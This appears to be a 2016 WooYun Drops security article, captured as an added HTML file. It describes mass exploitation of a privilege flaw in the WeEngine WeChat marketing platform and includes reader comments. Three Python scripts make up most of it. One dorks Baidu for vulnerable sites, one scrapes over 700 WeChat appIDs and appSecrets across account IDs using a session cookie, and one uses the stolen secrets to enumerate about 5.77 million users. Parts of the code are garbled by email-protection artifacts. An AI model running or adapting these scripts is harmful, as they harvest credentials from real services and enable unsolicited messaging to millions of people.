@@ -1,0 +1,303 @@
+
+
+  
+
+  
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">是谁让你我如此近距离（论第三方微信营销平台的安全隐患）</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" class="author name ng-binding">
+          纳米翡翠</a>
+        <span class="bull">·</span>
+        <time title="2016/03/23 16:04" ui-time="" datetime="2016/03/23 16:04" class="published ng-binding ng-isolate-scope">2016/03/23 16:04</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><h1>0x00 简介</h1>
+
+<hr>
+
+<p>开发微信第三方营销平台的人可谓是靠着微信官方开发文档发家的人，他们把开发文档变成产品，变成普通人一看就明白的东西，好多搞营销的不懂技术，好多做技术的不懂营销，他们可谓在技术和营销之前有效的搭了一座桥，让不懂技术的营销者可以通过第三方平台方便的接入微信。</p>
+
+<p>微信本身是安全的，但是第三方平台的安全却没的保证，这篇文章就是想说明，在使用第三方平台便利性的同时埋下的安全隐患</p>
+
+<!--more-->
+
+<h1>0x01 从一个被忽略的漏洞说起</h1>
+
+<hr>
+
+<p>wooyun漏洞编号：wooyun-2016-0184202<br>
+<a href=" <a target=" _blank"="">WooYun: 微擎最新版可越权操作别人公众号</a> "> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2016-0184202">WooYun: 微擎最新版可越权操作别人公众号</a> </p>
+
+<p>很不解如此影响深远的漏洞，为什么会被忽略，是对客户的不负责任，还是对漏洞本身的不了解</p>
+
+<p>接下来就从这个被忽略的漏洞，挖出其背后成千上万受影响的用户</p>
+
+<h1>0x02 挖掘过程</h1>
+
+<hr>
+
+<ol>
+<li>百度搜索使用微擎系统的链接</li>
+<li>注册并登录受影响的系统</li>
+<li>批量获取受影响的系统中的微信appID和appSecret</li>
+<li>通过调用微信开发者接口获取相应appID的用户列表</li>
+<li>向这些用户发送hello world</li>
+</ol>
+
+<p><strong>百度搜索使用微擎系统的链接</strong></p>
+
+<pre><code>#!python
+#!/usr/bin/env python
+#coding:utf-8
+import requests
+import re
+from lxml import etree
+import sys
+reload(sys)
+sys.setdefaultencoding('utf-8')
+def getSearch(url):
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) "}
+    content = getContent(url, headers)
+    selector = etree.HTML(content)
+    selectUrl = selector.xpath('//div[@class="f13"]/a[1]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a28de2cad0c7c4">[email&#160;protected]</a>')
+    urls.extend(selectUrl)
+def getSearchUrl(urls):
+    for url in urls:
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) "}
+        header = "Location"
+        content = getRespHeader(url, headers, header)
+        selectUrl.append(content)
+def getContent(url, headers):
+    resp = requests.get(url, headers=headers)
+    return resp.text
+def getRespHeader(url, headers, header):
+    resp = requests.get(url, headers=headers, allow_redirects=False)
+    return resp.headers.get(header)
+if __name__ == '__main__':
+    urls = []
+    selectUrl = []
+    for i in [0, 10, 20, 30, 40, 50, 60]:
+    url = "http://www.baidu.com/s?wd=inurl%%3Aweb%%2Findex.php%%3Fc%%3Duser%%26a%%3Dlogin%%26&amp;pn=%d&amp;ie=utf-8" %i
+    getSearch(url)
+    getSearchUrl(urls)
+    print selectUrl
+</code></pre>
+
+<p>结果搜到63条链接：</p>
+
+<p><img alt="p1" img-src="3c5d8bcadc6c188fc4222aef0efc9777ccd8a26a.jpg"></p>
+
+<p><strong>注册并登录受影响的系统</strong></p>
+
+<p>本来打算写个脚本批量注册然后出appid和key的，但由于有验证码，又因为本地验证码程序没有跑起来，而且也就60多个网站，于是乎就手工了一下，然后把拿appid和appSecret的过程写了个脚本</p>
+
+<p><strong>批量获取受影响的系统中的微信appID和appSecret</strong></p>
+
+<pre><code>#!python
+#!/usr/bin/env python
+#coding:utf-8
+import requests
+from lxml import etree
+import sys
+reload(sys)
+sys.setdefaultencoding('utf-8')
+header = {"cookie":"7ba5___session=eyJ1aWQiOiIxMTE1IiwibGFzdHZpc2l0IjoiMTQ1ODQ3NTc1MyIsImxhc3RpcCI6IjIxOC4xMDguMTI4LjEwMSIsImhhc2giOiI4YzcyMjFjOTE4Y2U2NjY1ZTdiMTQxYWJlYmRlZTcxOSJ9","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) "}
+def getcontent(url,header):
+    resp = requests.get(url, headers=header)
+    return resp.text
+def getkey(html):
+    global count
+    rest = []
+    selector = etree.HTML(html)
+    weixinAppId = selector.xpath('//input[@name="key"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c2ed82b4a3aeb7a7">[email&#160;protected]</a>')
+    weixinAppSecret = selector.xpath('//input[@name="secret"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dff09fa9beb3aaba">[email&#160;protected]</a>')
+    weixinAppName = selector.xpath('//input[@name="subname"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="634c2315020f1606">[email&#160;protected]</a>')
+    if weixinAppId[0] != '' and weixinAppSecret[0] != '' and weixinAppId[0].find('wx') == 0:
+        print weixinAppName[0]
+    rest.append(weixinAppName[0])
+    rest.append(weixinAppId[0])
+    rest.append(weixinAppSecret[0])
+    str_rest = str(rest).replace('u\'','\'')
+    str_rest = str_rest.decode("unicode-escape")
+    with open('result.txt', 'a') as fs:
+        fs.write(str_rest + '\n')
+if __name__ == '__main__':
+    for i in range(1, 1056):
+        url = "http://wx.xxx.cn/web/index.php?c=account&amp;a=post&amp;uniacid=84&amp;acid=%d" %i
+        print url
+    html = getcontent(url, header)
+    getkey(html)
+</code></pre>
+
+<p>待每个链接都尝试之后，一共捕获到700多个微信appid和secret</p>
+
+<p><img alt="p2" img-src="7a003f97f3275a4196fedd852c51b3cb35f69a63.jpg"></p>
+
+<p><strong>通过调用微信开发者接口获取相应appID的用户列表</strong></p>
+
+<p>这里通过脚本获取一下这么多微信appid一共涉及多少用户</p>
+
+<pre><code>#!python
+# coding:utf-8
+import requests
+import ast
+count = 0
+
+def getCount(url):
+    global count
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) "}
+    resp = requests.get(url, headers=headers)
+    con = ast.literal_eval(resp.text)
+    if type(con) == dict and "total" in con:
+        count += int(con["total"])
+
+def getAccesstoken(content):
+    con = ast.literal_eval(content)
+    if type(con) == dict and "access_token" in con:
+        url = "https://api.weixin.qq.com/cgi-bin/user/get?access_token=%s" % con["access_token"]
+        getCount(url)
+
+def getContent(line):
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) "}
+    wxappid = line[1]
+    wxsecret = line[2]
+    url = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=%s&amp;secret=%s" % (wxappid, wxsecret)
+    resp = requests.get(url, headers=headers)
+    getAccesstoken(resp.text)
+
+if __name__ == '__main__':
+    with open('result.txt', 'r') as fs:
+        for line in fs.readlines():
+            line = line.replace('\r', '').replace('\n', '')
+            getContent(eval(line))
+    print count
+</code></pre>
+
+<p>跑完脚本发现一共涉及到577万用户</p>
+
+<p><img alt="p3" img-src="d98db4d8e533859149f88d747aca76a73a81c6fa.jpg"></p>
+
+<h1>0x03 结尾</h1>
+
+<hr>
+
+<p>这570多万用户重复率很低，可以向这570万用户推送广告，可以向这570万用户发送消息，可以向这500万用户发送一句"你我如此近距离，你却不知道我是谁"。</p>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+		<div style="float:left;color:#9d9e9f;font-size:15px">
+			<span>
+				&copy;乌云知识库版权所有 未经许可 禁止转载
+			</span>
+		</div>
+        
+
+      </div>
+
+          
+  <!-- collect end -->
+  <!-- recommend -->
+  
+  <!-- recommend end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            
+          <div id="comment-list">
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Chinalover</span>
+                 <span class="reply-time">2016-03-23 23:51:00</span>
+        </div>
+        <p></p><p>批量的很爽啊。。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Ryan</span>
+                 <span class="reply-time">2016-03-23 18:37:16</span>
+        </div>
+        <p></p><p>按步骤模仿了一下，漏洞已经关了样</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">从容</span>
+                 <span class="reply-time">2016-03-23 17:32:30</span>
+        </div>
+        <p></p><p>@diaosi 他就是作者</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">风格</span>
+                 <span class="reply-time">2016-03-23 16:45:45</span>
+        </div>
+        <p></p><p>666</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">diaosi</span>
+                 <span class="reply-time">2016-03-23 16:35:43</span>
+        </div>
+        <p></p><p>你有权限看漏洞细节，你好叼！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">被抢走ID的CF_HB</span>
+                     <span class="weibo"></span>
+                    <span class="reply-time">2016-03-23 16:28:51</span>
+        </div>
+        <p></p><p>现在把漏洞编成一个paper,投在Drops比提交一个漏洞更划算。。</p>
+<p></p>
+        
+      </div>
+    </div>
+      </div>
+  </div>
+  <!-- comment end -->
+  
+</div>
+</main>
